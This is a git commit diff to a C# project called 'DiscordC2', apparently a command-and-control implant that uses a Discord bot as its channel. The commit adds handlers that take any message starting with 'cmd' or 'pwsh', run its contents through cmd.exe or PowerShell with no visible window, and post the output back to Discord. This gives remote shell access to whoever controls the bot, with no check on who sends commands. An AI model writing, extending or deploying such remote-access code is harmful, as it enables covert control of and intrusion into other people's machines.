7d069ecf1b4f8d5d72c94cff41d75987d091f503
Joachim Fosse <fojo1709@gmail.com>
2024-04-18 19:47:39 +0200

    simple implementation of cmd/pwsh commands

--- Program.cs
+++ Program.cs
@@ -1,4 +1,6 @@
-﻿using DSharpPlus;
+﻿using System.Diagnostics;
+using System.Text;
+using DSharpPlus;
 
 namespace DiscordC2;
 
@@ -26,16 +28,75 @@ namespace DiscordC2;
                 Token =  File.ReadAllText(".dc2"),
                 TokenType = TokenType.Bot,
                 Intents = DiscordIntents.AllUnprivileged | DiscordIntents.MessageContents
-        }); 
+        });
 
         discord.MessageCreated += async (s, e) => {
-            if (e.Message.Content.ToLower().StartsWith("ping")) {
-                await e.Message.RespondAsync("pong!");
+            if (e.Message.Content.ToLower().StartsWith("cmd")) {
+                var (success, details, localException) = await Operations.STask(e.Message.Content.Replace("cmd", "/C"));
+                if (success) {
+                    await e.Message.RespondAsync(details);
+                }
+                else if (localException is not null) {
+                    await e.Message.RespondAsync(localException.Message);
+                }
+            }
+
+            if (e.Message.Content.ToLower().StartsWith("pwsh")) {
+                var (success, details, localException) = await Operations.STask(e.Message.Content.Replace("pwsh", "-NoProfile "), "powershell");
+                if (success) {
+                    await e.Message.RespondAsync(details);
+                }
+                else if (localException is not null) {
+                    await e.Message.RespondAsync(localException.Message);
+                }
             }
         };
 
         Console.WriteLine("DiscordC2::Server booting..");
         await discord.ConnectAsync();
         Console.WriteLine("DiscordC2::Booting finished");
+    }
+
+    internal class Operations {
+        public static async Task<(bool succcess, string, Exception localException)> STask(string args, string taskType = "cmd")
+        {
+            try
+            {
+
+                var start = new ProcessStartInfo
+                {
+                    FileName = $"{taskType}.exe",
+                    RedirectStandardOutput = true,
+                    Arguments = "" + args,
+                    CreateNoWindow = true
+                };
+
+                using var process = Process.Start(start);
+                using var reader = process!.StandardOutput;
+
+                process.EnableRaisingEvents = true;
+
+                var lineData = await reader.ReadToEndAsync();
+                var items = lineData.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
+
+                StringBuilder builder = new();
+                foreach (var item in items)
+                {
+                    if (item.Contains("["))
+                    {
+                        builder.AppendLine(item.Substring(0, item.IndexOf("[", StringComparison.Ordinal) - 1));
+                    } else {
+                        builder.AppendLine(item);
+                    }
+                }
+
+                return (true, builder.ToString(), null)!;
+            }
+            catch (Exception localException)
+            {
+
+                return (false, "Failed", localException);
+            }
+        }
     }
  }
